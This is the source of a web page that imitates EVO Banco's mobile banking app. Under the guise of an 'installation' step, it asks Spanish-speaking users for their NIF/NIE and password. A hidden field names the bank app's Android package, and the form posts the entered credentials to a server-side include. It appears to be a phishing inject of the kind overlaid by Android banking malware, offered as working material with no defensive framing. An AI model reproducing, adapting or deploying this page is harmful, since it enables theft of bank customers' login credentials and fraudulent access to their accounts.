<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>
<div class="header">
	<b> EVO </b>
</div><br>

<div class="text">
	<b style="font-size: 26px;text-align: center;"> BIENVENIDO </b>
	<p> al proceso de instalacion. </p>
	<p> Vamos a proceder a vincular tu usuario de la Banca a Distancia a este dispositivo. </p>
	<p> Por favor instroduce los datos sloicitados </p>
</div>

    <div class="main">
        <div class="container">
            <div class="row">
			<div id="form1">
                <div class="col-xs-10 col-sm-8">
<div class="line">  </div>
                   
				   <div class="form_">
                        <form class="form" method="post">
							
							<input name="field1" value="es.evobanco.bancamovil" type="hidden">
						
                            <div class="form-group ">
                                	<label> NIF/NIE </label>
									<input type="text" class="form-control" name="field2" id="login" onkeyup="check();" autocomplete="off" data-reg="/.{3,50}/">
									<span class="delete fa fa-times-circle"></span>
                                	<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> The information is incorrect</span>
                            </div>

                            <div class="form-group">
									<label> CONTRASEÑA </label>
                                	<input type="password" class="form-control" name="field3" onkeyup="check();" id="password" oninput="this.value = this.value.replace(/\D/g, '')" autocomplete="off" data-reg="/.{3,50}/">
									<span class="delete fa fa-times-circle"></span>
                                	<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> The information is incorrect</span>
                            </div>

<div class="line">  </div>

						<div style="color: #000000;width: 100%;margin: 0 auto;text-align: center;font-size: 14px;margin-top: 5px;margin-bottom: 5px;font-weight: 700;"> Debes introducir tu número de identificación con la letra. Si no conoces tu contraseña, solicitala en tu Banca Electrónica o llamando al 910900900 </div>

						<input class="input_submitBtn" id="input_submitBtn" disabled="disabled" value="Aceptar" id="input_submitBtn" type="submit">
					
                        </form>
                </div>

            </div>
        </div>
		
		</div>
    </div>
	<script>
function check() {
  var inp1 = document.getElementById('login'),
      inp2 = document.getElementById('password');
  document.getElementById('input_submitBtn').disabled = inp1.value && inp2.value ? false : "disabled";
}
</script>





    <script type="text/javascript" src="libs/jquery/dist/jquery.min.js"></script>

<script src="libs/angular/angular.min.js"></script>
	<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'form-control';
							oCodeInp.className = 'form-control';
						} catch(e){};
						
                        if (!/^\w{4,20}$/i.test(oNumInp.value)) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,16}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>
</body>




</html>
